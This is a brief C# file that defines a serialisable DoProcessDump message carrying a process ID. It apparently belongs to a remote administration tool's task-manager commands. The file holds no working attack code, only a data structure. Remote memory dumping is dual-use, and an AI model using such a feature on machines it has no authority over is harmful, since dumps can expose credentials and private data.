using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoProcessDump : IMessage
    {
        [Key(1)]
        public int Pid { get; set; }
    }
}
